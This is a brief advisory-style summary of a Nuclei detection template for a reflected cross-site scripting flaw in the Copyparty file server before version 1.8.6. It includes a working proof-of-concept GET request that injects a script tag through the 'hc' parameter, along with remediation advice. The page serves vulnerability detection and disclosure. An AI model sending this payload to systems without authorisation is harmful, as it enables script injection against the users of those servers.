# Nuclei Template: Copyparty v1.8.6 - Cross-Site Scripting
**Template ID:** copyparty-xss
**Vulnerability Class:** Improper Neutralization of Script-Related HTML Tags in a Web Page (Basic XSS)
**Severity:** Medium
**CWE:** CWE-80
**Source:** Nuclei Template (`copyparty-xss.yaml`)

## Vulnerability Information & PoC

## Description
Copyparty is a portable file server. Versions prior to 1.8.6 are subject to a reflected cross-site scripting (XSS) Attack. The vulnerability in the application's web interface could allow an attacker to execute malicious javascript code by tricking users into accessing a malicious link.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/?hc=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E
```

## Remediation
Upgrade to the latest version to mitigate this vulnerability.

## References
- https://github.com/9001/copyparty/security/advisories/GHSA-cw7j-v52w-fp5r
